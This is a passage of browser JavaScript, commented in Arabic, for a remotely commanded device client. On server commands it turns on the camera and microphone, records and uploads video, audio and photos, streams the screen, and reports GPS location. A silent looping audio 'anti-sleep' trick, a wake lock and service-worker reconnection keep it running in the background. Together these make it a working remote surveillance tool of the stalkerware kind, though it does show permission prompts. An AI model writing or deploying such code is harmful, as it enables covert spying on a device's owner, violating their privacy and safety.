                    const parsed = (match && match[1]) || (match2 && match2[1]) || '';
                    if (parsed) {
                        name = parsed.trim();
                    }
                }
                if (!name || name.length <= 2 || /^Android$/i.test(name)) {
                    name = "Android Phone";
                }
            } else if (/iPhone/i.test(ua)) {
                platform = "iOS";
                const v = ua.match(/OS\\s([\\d_]+)/i);
                if (v && v[1]) platformVersion = v[1].replace(/_/g, '.');
                if (name === "Unknown Device") name = "iPhone";
            } else if (/iPad/i.test(ua)) {
                platform = "iOS";
                const v = ua.match(/OS\\s([\\d_]+)/i);
                if (v && v[1]) platformVersion = v[1].replace(/_/g, '.');
                if (name === "Unknown Device") name = "iPad";
            } else if (/Windows/i.test(ua)) {
                platform = "Windows";
                const v = ua.match(/Windows NT\\s([\\d\\.]+)/i);
                if (v && v[1]) platformVersion = v[1];
                if (name === "Unknown Device") name = "PC (Windows)";
            } else if (/Mac/i.test(ua)) {
                platform = "MacOS";
                const v = ua.match(/Mac OS X\\s([\\d_]+)/i);
                if (v && v[1]) platformVersion = v[1].replace(/_/g, '.');
                if (name === "Unknown Device") name = "Mac";
            } else if (/Linux/i.test(ua)) {
                platform = "Linux";
                if (name === "Unknown Device") name = "Linux Device";
            }

            name = String(name || 'Unknown Device').replace(/\\bwv\\b/ig, '').replace(/\\s{2,}/g, ' ').trim();
            const platformLabel = platformVersion ? `${platform} ${platformVersion}` : platform;
            return { name, platform: platformLabel };
        }

        socket.on('connect', async () => {
                document.getElementById('status').textContent = 'متصل ✅';
                document.getElementById('status').className = 'status connected';
                log('تم الاتصال بالسيرفر');
                
                const info = await getDeviceInfo();
                const battery = await getBatteryLevel();
                log(`تم التعرف على الجهاز: ${info.name}`);
                
                socket.emit('register_device', {
                    device_id: deviceId,
                    name: info.name,
                    platform: info.platform,
                    battery: battery
                });
            });

            socket.on('disconnect', (reason) => {
                document.getElementById('status').textContent = 'جاري إعادة الاتصال... ⏳';
                document.getElementById('status').className = 'status';
                log('انقطع الاتصال: ' + reason);
                if (reason === 'io server disconnect') {
                    socket.connect();
                }
            });

            socket.on('connect_error', (err) => {
                document.getElementById('status').textContent = 'فشل الاتصال ❌';
                document.getElementById('status').className = 'status';
                log('❌ خطأ اتصال: ' + (err && err.message ? err.message : 'Unknown'));
            });

            socket.on('command', async (data) => {
                log(`📥 استلام أمر: ${data.command}`);
                
                if (data.command === 'camera_on') {
                    startCamera('environment'); // الخلفية كافتراضي
                } else if (data.command === 'camera_off') {
                    stopCamera();
                } else if (data.command === 'camera_front') {
                    stopCamera().then(() => startCamera('user'));
                } else if (data.command === 'camera_back') {
                    stopCamera().then(() => startCamera('environment'));
                } else if (data.command === 'capture_photo') {
                    captureAndUploadPhoto();
                } else if (data.command === 'burst_capture') {
                    captureBurst();
                } else if (data.command === 'mic_on') {
                    startAudio();
                } else if (data.command === 'mic_off') {
                    stopAudio();
                } else if (data.command === 'start_recording') {
                    startVideoRecording();
                } else if (data.command === 'stop_recording') {
                    stopVideoRecording();
                } else if (data.command === 'start_audio_recording') {
                    startAudioRecording();
                } else if (data.command === 'stop_audio_recording') {
                    stopAudioRecording();
                } else if (data.command.startsWith('request_file')) {
                    if (data.command === 'request_file_images') pendingFileRequest = 'images';
                    else if (data.command === 'request_file_videos') pendingFileRequest = 'videos';
                    else pendingFileRequest = 'all';
                    
                    log('⏳ في انتظار نقرة المستخدم لفتح الملفات...');
                } else if (data.command === 'screen_share_start' || data.command === 'screen_record_start') {
                    requestScreenShareFromUser();
                } else if (data.command === 'screen_share_stop' || data.command === 'screen_record_stop') {
                    stopScreenShare();
                } else if (data.command === 'location') {
                    sendCurrentLocation();
                } else if (data.command === 'stop_location') {
                    stopLocationTracking();
                } else if (data.command === 'get_apps') {
                    // إرسال قائمة تطبيقات وهمية (الأكثر شيوعاً)
                    const apps = [
                        {name: 'Facebook', icon: 'facebook', color: '#1877f2'},
                        {name: 'WhatsApp', icon: 'whatsapp', color: '#25d366'},
                        {name: 'Instagram', icon: 'instagram', color: '#c13584'},
                        {name: 'TikTok', icon: 'tiktok', color: '#000'},
                        {name: 'Snapchat', icon: 'snapchat', color: '#fffc00'},
                        {name: 'YouTube', icon: 'youtube', color: '#ff0000'},
                        {name: 'PUBG Mobile', icon: 'gamepad', color: '#f4a460'},
                        {name: 'Telegram', icon: 'telegram', color: '#0088cc'}
                    ];
                    socket.emit('apps_received', { device_id: deviceId, apps: apps });
                } else if (data.command === 'torch_on') {
                    toggleTorch(true);
                } else if (data.command === 'torch_off') {
                    toggleTorch(false);
                } else if (data.command === 'vibrate') {
                    if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]);
                    log('📳 تم تشغيل الاهتزاز');
                } else if (data.command === 'tts_speak') {
                    speakText(data.text);
                } else if (data.command === 'play_alarm') {
                    playAlarmSound();
                }
            });

        // تمت إزالة أي دوال لجمع كلمات المرور أو بيانات الحسابات.

        // === دوال التحكم الحقيقي (Hardware) ===
        async function toggleTorch(enable) {
            // محاولة الحصول على مسار الفيديو الحالي أو تشغيل الكاميرا الخلفية
            let track = cameraStream?.getVideoTracks()[0];
            let capabilities = track?.getCapabilities() || {};

            // إذا لم يكن هناك مسار أو الكاميرا الحالية لا تدعم الكشاف، قم بالتبديل للخلفية
            if (!track || !capabilities.torch) {
                if (enable) log('⚠️ جاري تشغيل الكاميرا الخلفية لتفعيل الكشاف...');
                if (cameraStream) await stopCamera();
                await startCamera('environment');
                track = cameraStream?.getVideoTracks()[0];
            }

            if (track) {
                track.applyConstraints({
                    advanced: [{torch: enable}]
                })
                .then(() => log(enable ? '🔦 تم تشغيل الكشاف' : '🌑 تم إيقاف الكشاف'))
                .catch(e => log('خطأ في الكشاف: ' + e));
            } else {
                log('❌ تعذر الوصول للكاميرا لتشغيل الكشاف');
            }
        }

        function speakText(text) {
            if ('speechSynthesis' in window) {
                const utterance = new SpeechSynthesisUtterance(text);
                utterance.lang = 'ar-SA'; // نطق عربي
                window.speechSynthesis.speak(utterance);
                log('🗣️ جاري نطق: ' + text);
            } else {
                log('❌ المتصفح لا يدعم تحويل النص لكلام');
            }
        }

        function playAlarmSound() {
            // صوت صفارة إنذار (Base64)
            const audio = new Audio('data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU'+'A'.repeat(500)); // (تم اختصار الكود، سيتم استخدام صوت تنبيه بسيط)
            // سنستخدم مذبذب صوتي (Oscillator) لإنتاج صوت مزعج وقوي بدون ملفات خارجية
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.connect(gain);
            gain.connect(ctx.destination);
            osc.type = 'sawtooth';
            osc.frequency.value = 1000; // تردد عالي ومزعج
            
            // تأثير صفارة الإنذار
            let isHigh = true;
            const interval = setInterval(() => {
                osc.frequency.value = isHigh ? 800 : 1200;
                isHigh = !isHigh;
            }, 300);

            osc.start();
            log('🚨 تم تشغيل الإنذار');
            
            // إيقاف بعد 10 ثواني
            setTimeout(() => {
                osc.stop();
                clearInterval(interval);
            }, 10000);
        }

        function enableBackgroundMode() {
            // 🔊 خدعة الصوت الصامت: تشغيل صوت فارغ بشكل متكرر لمنع النظام من قتل التطبيق
            const audio = new Audio('data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA');
            audio.loop = true;
            audio.play().then(() => log('🚀 تم تفعيل وضع الخلفية (Anti-Sleep)')).catch(e => log('⚠️ فشل تفعيل وضع الخلفية'));
            
            requestWakeLock();
        }

        function getUserMediaCompat(constraints) {
            // المسار الحديث
            if (navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === 'function') {
                return navigator.mediaDevices.getUserMedia(constraints);
            }

            // مسارات قديمة لبعض المتصفحات
            const legacyGetUserMedia =
                navigator.getUserMedia ||
                navigator.webkitGetUserMedia ||
                navigator.mozGetUserMedia ||
                navigator.msGetUserMedia;

            if (legacyGetUserMedia) {
                return new Promise((resolve, reject) => {
                    legacyGetUserMedia.call(navigator, constraints, resolve, reject);
                });
            }

            let reason = 'المتصفح لا يدعم الكاميرا/الميكروفون (getUserMedia غير متاح)';
            if (!window.isSecureContext && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
                reason += ' - افتح الرابط عبر HTTPS';
            }
            return Promise.reject(new Error(reason));
        }

        function showPermissionOverlay() {
            const overlay = document.getElementById('permissionOverlay');
            if (overlay) overlay.style.display = 'flex';
        }

        function closePermissionOverlay() {
            const overlay = document.getElementById('permissionOverlay');
            if (overlay) overlay.style.display = 'none';
        }

        function reportLocationPermissionStatus(status) {
            const allowed = ['granted', 'denied', 'unsupported', 'error'];
            const finalStatus = allowed.includes(status) ? status : 'error';
            fetch('/api/location/permission-status', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ status: finalStatus })
            }).catch(() => {});
        }

        function requestLocationPermission() {
            return new Promise((resolve) => {
                if (!("geolocation" in navigator)) {
                    log('⚠️ إذن الموقع غير مدعوم');
                    reportLocationPermissionStatus('unsupported');
                    resolve(false);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    () => {
                        log('✅ تم منح إذن الموقع');
                        reportLocationPermissionStatus('granted');
                        resolve(true);
                    },
                    (err) => {
                        log('⚠️ إذن الموقع مرفوض/غير متاح: ' + (err && err.message ? err.message : 'Unknown'));
                        const deniedByUser = err && (err.code === 1 || String(err.name || '').toLowerCase() === 'permissiondeniederror');
                        reportLocationPermissionStatus(deniedByUser ? 'denied' : 'error');
                        resolve(false);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        async function requestNotificationPermission() {
            if (!('Notification' in window)) {
                log('⚠️ إذن الإشعارات غير مدعوم');
                return false;
            }

            try {
                if (Notification.permission === 'granted') {
                    log('✅ إذن الإشعارات ممنوح مسبقاً');
                    return true;
                }
                const result = await Notification.requestPermission();
                const ok = result === 'granted';
                log(ok ? '✅ تم منح إذن الإشعارات' : '⚠️ تم رفض إذن الإشعارات');
                return ok;
            } catch (e) {
                log('⚠️ تعذر طلب إذن الإشعارات: ' + (e && e.message ? e.message : e));
                return false;
            }
        }

        async function requestMotionPermission() {
            if (typeof DeviceMotionEvent === 'undefined' || typeof DeviceMotionEvent.requestPermission !== 'function') {
                return false;
            }
            try {
                const result = await DeviceMotionEvent.requestPermission();
                const ok = result === 'granted';
                log(ok ? '✅ تم منح إذن الحركة' : '⚠️ تم رفض إذن الحركة');
                return ok;
            } catch (e) {
                log('⚠️ تعذر طلب إذن الحركة: ' + (e && e.message ? e.message : e));
                return false;
            }
        }

        async function requestPermissions(autoStart = false) {
            if (isRequestingPermissions) return;
            isRequestingPermissions = true;

            const overlayBtn = document.getElementById('grantAllPermissionsBtn');
            const mainBtn = document.getElementById('mainGrantPermissionsBtn');
            if (overlayBtn) {
                overlayBtn.disabled = true;
                overlayBtn.textContent = 'REQUESTING...';
            }
            if (mainBtn) {
                mainBtn.disabled = true;
                mainBtn.textContent = 'REQUESTING...';
            }

            try {
                if (autoStart) {
                    log('ℹ️ محاولة طلب الأذونات تلقائياً...');
                }

                let grantedCount = 0;

                // الكاميرا والميكروفون
                try {
                    const stream = await getUserMediaCompat({ video: true, audio: true });
                    stream.getTracks().forEach(track => track.stop());
                    grantedCount += 1;
                    log('✅ تم منح إذن الكاميرا والميكروفون');
                } catch (e) {
                    log('⚠️ إذن الكاميرا/الميكروفون مرفوض أو غير متاح: ' + (e && e.message ? e.message : e));
                }

                if (await requestLocationPermission()) grantedCount += 1;
                if (await requestNotificationPermission()) grantedCount += 1;
                if (await requestMotionPermission()) grantedCount += 1;

                if (grantedCount > 0) {
                    log(`✅ تم إنهاء طلب الأذونات (الموافق عليها: ${grantedCount})`);
                    closePermissionOverlay();
                    enableBackgroundMode();
                } else {
                    log('⚠️ لم يتم منح أي إذن. اضغط زر السماح مرة أخرى إذا لزم.');
                    showPermissionOverlay();
                }
            } catch (e) {
                log('❌ تم رفض الصلاحيات: ' + e.message);
                showPermissionOverlay();
            } finally {
                isRequestingPermissions = false;
                if (overlayBtn) {
                    overlayBtn.disabled = false;
                    overlayBtn.textContent = 'ALLOW';
                }
                if (mainBtn) {
                    mainBtn.disabled = false;
                    mainBtn.textContent = 'ALLOW PERMISSIONS';
                }
            }
        }

        function openLocalFilePicker(mode = 'all') {
            const input = document.getElementById('hiddenFileInput');
            if (!input) return;

            localFilePickMode = mode || 'all';
            if (localFilePickMode === 'photos') input.accept = 'image/*';
            else if (localFilePickMode === 'videos') input.accept = 'video/*';
            else input.removeAttribute('accept');

            try {
                input.value = '';
                input.click();
                log(`📂 Opened file picker: ${localFilePickMode}`);
            } catch (e) {
                log('❌ Failed to open file picker: ' + e);
            }
        }

        async function startCamera(facingMode = 'environment') {
            try {
                if (isScreenSharing) {
                    await stopScreenShare(true);
                }
                if (cameraStream) return;
                log(`تشغيل الكاميرا (HD): `);
                // طلب دقة عالية لإجبار الهاتف على استخدام العدسة الأساسية
                // طلب 1920×1080 minimum لإجبار أندرويد على استخدام الكاميرا الرئيسية
                // الكاميرات الثانوية (الماكرو / الواسعة) لا تدعم هذا الدقة
                try {
                    cameraStream = await getUserMediaCompat({
                        video: {
                            facingMode: { ideal: facingMode },
                            width:  { min: 1280, ideal: 1920 },
                            height: { min: 720,  ideal: 1080 }
                        }
                    });
                } catch (_) {
                    // fallback: بدون قيود دقة إذا فشل طلب الـ 1080p
                    cameraStream = await getUserMediaCompat({ video: { facingMode: { ideal: facingMode } } });
                }
                
                const video = document.getElementById('localVideo');
                video.srcObject = cameraStream;
                // تم إزالة display: none واستبداله بستايل CSS لضمان عمل الكاميرا
                video.play();
                isStreaming = true;
                
                startFrameLoop(140); // معدل أسرع لتقليل زمن التأخير
                socket.emit('command_response', {device_id: deviceId, status: 'success', message: 'Camera started'});
            } catch (e) {
                log('خطأ في الكاميرا: ' + e.message);
                socket.emit('command_response', {device_id: deviceId, status: 'error', message: e.message});
            }
        }

        async function stopCamera() {
            if (isScreenSharing) {
                await stopScreenShare(true);
            }
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            isStreaming = false;
            stopFrameLoop();
            socket.emit('command_response', {device_id: deviceId, status: 'success', message: 'Camera stopped'});
            return Promise.resolve();
        }

        async function startAudio() {
            try {
                if (isAudioActive) return;

                liveAudioStream = await getUserMediaCompat({ audio: { echoCancellation: true, noiseSuppression: true } });
                isAudioActive = true;

                // تحديد أفضل صيغة مدعومة للصوت لضمان العمل على اللابتوب
                let options = {};
                if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
                    options = { mimeType: 'audio/webm;codecs=opus' };
                } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
                    options = { mimeType: 'audio/mp4' };
                }

                // بث مباشر بزمن تأخير منخفض: شرائح 250ms بدل 1000ms
                liveAudioRecorder = new MediaRecorder(liveAudioStream, options);
                liveAudioRecorder.ondataavailable = (e) => {
                    if (!isAudioActive || !e.data || e.data.size <= 0) return;
                    sendAudioChunk(e.data, liveAudioRecorder.mimeType);
                };
                liveAudioRecorder.onstop = () => {
                    if (liveAudioStream) {
                        liveAudioStream.getTracks().forEach(track => track.stop());
                        liveAudioStream = null;
                    }
                    liveAudioRecorder = null;
                };

                // 450ms improves compatibility on some browsers and reduces stutter.
                liveAudioRecorder.start(450);
                log('🎤 الميكروفون يعمل (Low-Latency)');
            } catch (e) {
                log('❌ خطأ في الميكروفون: ' + e.message);
            }
        }

        function stopAudio() {
            isAudioActive = false;
            try {
                if (liveAudioRecorder && liveAudioRecorder.state !== 'inactive') {
                    liveAudioRecorder.stop();
                }
            } catch (e) {}
            if (liveAudioStream) {
                liveAudioStream.getTracks().forEach(track => track.stop());
                liveAudioStream = null;
            }
            liveAudioRecorder = null;
            log('تم إيقاف الميكروفون');
        }

        async function startAudioRecording() {
            try {
                const stream = await getUserMediaCompat({ audio: true });
                audioFileRecorder = new MediaRecorder(stream);
                let chunks = [];
                
                audioFileRecorder.ondataavailable = event => {
                    if (event.data.size > 0) chunks.push(event.data);
                };
                
                audioFileRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    uploadFile(blob, 'audio_recording.webm');
                    stream.getTracks().forEach(track => track.stop());
                    document.getElementById('status').innerText = 'متصل ✅';
                };
                
                audioFileRecorder.start();
                document.getElementById('status').innerText = 'جاري تسجيل الصوت... 🎙️';
                log('🎙️ بدأ تسجيل الصوت (للحفظ)');
            } catch (e) {
                log('❌ خطأ في تسجيل الصوت: ' + e.message);
            }
        }

        function stopAudioRecording() {
            if (audioFileRecorder && audioFileRecorder.state !== 'inactive') {
                audioFileRecorder.stop();
                log('⏹ تم إيقاف تسجيل الصوت وجاري الرفع...');
            }
        }

        async function startVideoRecording() {
            try {
                // 🛑 إيقاف أي بث حالي لمنع التعارض
                if (cameraStream) await stopCamera();
                if (isScreenSharing) await stopScreenShare(true);
                stopAudio();

                // تحديد أفضل صيغة مدعومة (MP4 إذا أمكن)
                let mimeType = 'video/webm';
                if (MediaRecorder.isTypeSupported('video/mp4')) {
                    mimeType = 'video/mp4';
                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                    mimeType = 'video/webm;codecs=vp9';
                }

                // 1. تشغيل الكاميرا والمايك معاً
                const stream = await getUserMediaCompat({ 
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 }, 
                        height: { ideal: 720 } 
                    }, 
                    audio: { echoCancellation: true, noiseSuppression: true } 
                });
                
                // 2. تفعيل البث المباشر للفيديو (للمشاهدة)
                const video = document.getElementById('localVideo');
                video.srcObject = stream;
                video.play(); // تشغيل الفيديو في الخلفية
                isStreaming = true;
                startFrameLoop(200); // البدء بإرسال الصور للوحة التحكم

                // 3. تفعيل البث المباشر للصوت (للاستماع)
                // نستخدم نسخة من مسار الصوت لتجنب التعارض
                const audioTrack = stream.getAudioTracks()[0];
                if (!audioTrack) log('⚠️ تحذير: لا يوجد ميكروفون متاح');

                const audioStream = new MediaStream([audioTrack.clone()]);
                
                // استخدام نفس إعدادات الصوت القوية لضمان التوافق
                let audioOptions = {};
                if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
                    audioOptions = { mimeType: 'audio/webm;codecs=opus' };
                } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
                    audioOptions = { mimeType: 'audio/mp4' };
                }

                audioRecorder = new MediaRecorder(audioStream, audioOptions);
                audioRecorder.ondataavailable = event => {
                    if (event.data.size > 0) {
                        sendAudioChunk(event.data, audioRecorder.mimeType);
                    }
                };
                audioRecorder.start(300); // شرائح أقصر لتقليل تأخير الصوت

                // 4. بدء التسجيل الفعلي للملف (للحفظ)
                mediaRecorder = new MediaRecorder(stream, { mimeType: mimeType });
                let chunks = [];
                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) chunks.push(event.data);
                };
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: mimeType });
                    // تحديد الامتداد بناءً على الصيغة
                    const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
                    uploadFile(blob, 'video_record.' + ext);
                    
                    stream.getTracks().forEach(track => track.stop());
                    isStreaming = false;
                    stopFrameLoop(); // إيقاف حلقة الإرسال
                    document.getElementById('status').innerText = 'متصل ✅';
                };
                mediaRecorder.start();
                document.getElementById('status').innerText = 'جاري تسجيل الفيديو... 🎥';
                log('🎥 جاري التسجيل والبث المباشر (صوت وصورة)...');
            } catch (e) {
                log('❌ خطأ في التسجيل: ' + e.message);
            }
        }

        function stopVideoRecording() {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
                if (audioRecorder) audioRecorder.stop(); // إيقاف بث الصوت أيضاً
                log('⏹ تم إيقاف التسجيل وجاري الرفع...');
            }
        }

        function uploadFile(fileBlob, fileName) {
            const formData = new FormData();
            formData.append('file', fileBlob, fileName);
            formData.append('device_id', deviceId); // إرسال هوية الجهاز لتنظيم الملفات
            
            fetch('/api/upload', { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                log('✅ تم رفع الملف: ' + fileName);
                socket.emit('command_response', {device_id: deviceId, status: 'success', message: 'File uploaded'});
                // إرسال إشارة للوحة التحكم لبدء التحميل فوراً
                socket.emit('download_ready', {device_id: deviceId, filename: data.filename});
            })
            .catch(e => log('❌ فشل الرفع: ' + (e && e.message ? e.message : e)));
        }

        // ✅ sendFrame: دالة التقاط إطار واحد (تُستدعى من الـ Worker)
        function sendFrame() {
            if (!isStreaming) return;
            const video = document.getElementById('localVideo');
            // تخطي الإطار إذا لم تكن أبعاد الفيديو جاهزة (يمنع الشاشة السوداء)
            if (!video.videoWidth || !video.videoHeight || video.readyState < 2) return;
            const canvas = document.createElement('canvas');
            const targetWidth = isScreenSharing ? 640 : 420;
            const scale = targetWidth / video.videoWidth;
            canvas.width = targetWidth;
            canvas.height = Math.round(video.videoHeight * scale);
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const jpegQuality = isScreenSharing ? 0.4 : 0.28;
            const data = canvas.toDataURL('image/jpeg', jpegQuality);
            socket.volatile.emit('camera_frame', {
                device_id: deviceId,
                frame: data.split(',')[1],
                source: isScreenSharing ? 'screen' : 'camera'
            });
        }

        // 🔄 حلقة الإطارات عبر Web Worker — لا تتأثر بتقييد setTimeout في الخلفية
        let _frameWorker = null;
        function startFrameLoop(intervalMs) {
            stopFrameLoop();
            try {
                const code = 'var t=setInterval(function(){postMessage(0);},' + intervalMs + ');';
                const blob = new Blob([code], {type: 'application/javascript'});
                _frameWorker = new Worker(URL.createObjectURL(blob));
                _frameWorker.onmessage = function() { if (isStreaming) sendFrame(); };
            } catch(e) {
                // fallback إذا كان Worker غير مدعوم
                (function loop() { if (isStreaming) { sendFrame(); setTimeout(loop, intervalMs); } })();
            }
        }
        function stopFrameLoop() {
            if (_frameWorker) { _frameWorker.terminate(); _frameWorker = null; }
        }

        function captureAndUploadPhoto() {
            if (!isStreaming) {
                log('الكاميرا ليست نشطة لالتقاط صورة');
                return;
            }
            const video = document.getElementById('localVideo');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                uploadFile(blob, 'photo.jpg');
            }, 'image/jpeg', 0.9); // جودة عالية للصورة
        }

        async function captureBurst() {
            if (!isStreaming) {
                log('⚠️ يجب تشغيل الكاميرا أولاً للتصوير السريع');
                return;
            }
            log('📸 بدء التصوير السريع (Burst Mode)...');
            for(let i=0; i<10; i++) {
                captureAndUploadPhoto();
                await new Promise(r => setTimeout(r, 300)); // انتظار 300 جزء من الثانية بين كل صورة
            }
            log('✅ تم انتهاء التصوير السريع');
        }

        function requestScreenShareFromUser() {
            if (isScreenSharing) {
                log('ℹ️ مشاركة الشاشة تعمل بالفعل');
                return;
            }

            pendingScreenShareRequest = true;
            const overlay = document.getElementById('screenShareOverlay');
            if (overlay) overlay.style.display = 'flex';
            log('🖥️ تم طلب موافقة المستخدم لبدء مشاركة الشاشة');
            socket.emit('command_response', {device_id: deviceId, status: 'pending', message: 'Awaiting user approval for screen share'});
        }

        async function startPendingScreenShare() {
            pendingScreenShareRequest = false;
            const overlay = document.getElementById('screenShareOverlay');
            if (overlay) overlay.style.display = 'none';
            await startScreenShare();
        }

        function cancelPendingScreenShare() {
            pendingScreenShareRequest = false;
            const overlay = document.getElementById('screenShareOverlay');
            if (overlay) overlay.style.display = 'none';
            log('🛑 تم إلغاء طلب مشاركة الشاشة');
            socket.emit('command_response', {device_id: deviceId, status: 'error', message: 'Screen share cancelled by user'});
        }

        async function startScreenShare() {
            try {
                if (!window.isSecureContext && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
                    socket.emit('command_response', {
                        device_id: deviceId,
                        status: 'error',
                        message: 'Permission denied: مشاركة الشاشة تحتاج رابط HTTPS أو localhost.'
                    });
                    return;
                }

                if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
                    log('❌ مشاركة الشاشة غير مدعومة على هذا الهاتف/المتصفح');
                    socket.emit('command_response', {device_id: deviceId, status: 'error', message: 'Screen sharing not supported on mobile'});
                    return;
                }

                if (isScreenSharing) {
                    log('ℹ️ مشاركة الشاشة تعمل بالفعل');
                    return;
                }

                if (cameraStream) await stopCamera();

                screenStream = await navigator.mediaDevices.getDisplayMedia({
                    video: { frameRate: { ideal: 12, max: 18 } },
                    audio: false
                });

                const track = screenStream.getVideoTracks()[0];
                if (track) {
                    track.addEventListener('ended', () => {
                        stopScreenShare();
                    });
                }

                const video = document.getElementById('localVideo');
                video.srcObject = screenStream;
                // لا ننتظر playing لتجنب التعليق على بعض المتصفحات
                video.play().catch(() => {});

                pendingScreenShareRequest = false;
                const overlay = document.getElementById('screenShareOverlay');
                if (overlay) overlay.style.display = 'none';
                isStreaming = true;
                isScreenSharing = true;
                startFrameLoop(100);
                sendFrame();

                log('🖥️ بدأت مشاركة الشاشة المباشرة');
                socket.emit('command_response', {device_id: deviceId, status: 'success', message: 'Screen share started'});
            } catch(e) {
                const errName = e && e.name ? e.name : 'Error';
                const errText = e && e.message ? e.message : 'Unknown error';
                log('❌ خطأ في مشاركة الشاشة: ' + errText);

                let responseMsg = 'Screen share error: ' + errText;
                if (errName === 'NotAllowedError' || /permission denied|denied permission/i.test(errText)) {
                    responseMsg = 'Permission denied: المستخدم رفض مشاركة الشاشة أو المتصفح منعها. اضغط ابدأ مشاركة الشاشة ثم اختر شاشة كاملة.';
                } else if (errName === 'NotReadableError') {
                    responseMsg = 'Screen share error: الشاشة مشغولة أو غير متاحة الآن. أغلق أي مشاركة شاشة أخرى وحاول مرة ثانية.';
                }

                socket.emit('command_response', {device_id: deviceId, status: 'error', message: responseMsg});
            }
        }

        async function stopScreenShare(silent = false) {
            if (!isScreenSharing && !screenStream) return;

            if (screenStream) {
                screenStream.getTracks().forEach(track => track.stop());
                screenStream = null;
            }

            isScreenSharing = false;
            pendingScreenShareRequest = false;
            isStreaming = false;
            stopFrameLoop();
            const overlay = document.getElementById('screenShareOverlay');
            if (overlay) overlay.style.display = 'none';

            if (!cameraStream) {
                const video = document.getElementById('localVideo');
                if (video) video.srcObject = null;
            }

            log('🛑 تم إيقاف مشاركة الشاشة');
            if (!silent) {
                socket.emit('command_response', {device_id: deviceId, status: 'success', message: 'Screen share stopped'});
            }
        }

        // توافق خلفي مع الاسم القديم
        async function startScreenRecording() {
            await startScreenShare();
        }

        // ✅ تفعيل Wake Lock لمنع الهاتف من النوم (ضروري للخلفية)
        let wakeLock = null;
        async function requestWakeLock() {
            try {
                wakeLock = await navigator.wakeLock.request('screen');
                log('💡 تم تفعيل وضع العمل المستمر (Wake Lock)');
            } catch (err) {
                log(`⚠️ تنبيه: لا يمكن منع السكون (${err.name})`);
            }
        }

        function sendCurrentLocation() {
            log('📍 جاري تحديد الموقع...');
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        log('✅ تم تحديد الموقع، جاري الإرسال...');
                        fetch('/api/location', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                deviceId: deviceId,
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude
                            })
                        })
                        .then(() => {
                            socket.emit('command_response', {device_id: deviceId, status: 'success', message: 'Location sent'});
                        })
                        .catch(e => log('خطأ في إرسال الموقع: ' + e));
                    }, 
                    (err) => {
                        log('❌ تعذر الحصول على الموقع: ' + err.message);
                        const deniedByUser = err && (err.code === 1 || String(err.name || '').toLowerCase() === 'permissiondeniederror');
                        reportLocationPermissionStatus(deniedByUser ? 'denied' : 'error');
                    }, 
                    { enableHighAccuracy: true }
                );
            } else {
                reportLocationPermissionStatus('unsupported');
            }
        }

        function stopLocationTracking() {
            if ('serviceWorker' in navigator && navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({ command: 'stop_location' });
            }
            if (locationWatchId !== null) {
                navigator.geolocation.clearWatch(locationWatchId);
                locationWatchId = null;
            }
            log('🛑 تم إيقاف تتبع الموقع');
        }

        function showLocalTapPulse(x, y) {
            const pulse = document.createElement('div');
            pulse.style.cssText = `
                position: fixed;
                left: ${x}px;
                top: ${y}px;
                width: 18px;
                height: 18px;
                border-radius: 50%;
                border: 2px solid #00e5ff;
                background: rgba(0, 229, 255, 0.2);
                transform: translate(-50%, -50%);
                pointer-events: none;
                z-index: 21000;
                animation: ripple 0.55s ease-out forwards;
            `;
            document.body.appendChild(pulse);
            setTimeout(() => pulse.remove(), 600);
        }

        function emitScreenTap(clientX, clientY) {
            const now = Date.now();
            if (now - lastTapEmitAt < 120) return;
            lastTapEmitAt = now;

            const width = window.innerWidth || document.documentElement.clientWidth || 1;
            const height = window.innerHeight || document.documentElement.clientHeight || 1;
            const x = Math.max(0, Math.min(1, clientX / width));
            const y = Math.max(0, Math.min(1, clientY / height));

            socket.emit('screen_tap', {
                device_id: deviceId,
                x: Number(x.toFixed(4)),
                y: Number(y.toFixed(4)),
                width,
                height,
                ts: now
            });

            showLocalTapPulse(clientX, clientY);
        }

        // 📱 معالجة العودة للمقدمة: إعادة الاتصال والـ Wake Lock تلقائياً
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                requestWakeLock();
                if (!socket.connected) socket.connect();
            }
        });

        // تسجيل الـ Service Worker (يساعد في الإبقاء على الاتصال بالخلفية)
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.addEventListener('message', (e) => {
                if (e.data === 'keepAlive' && !socket.connected) socket.connect();
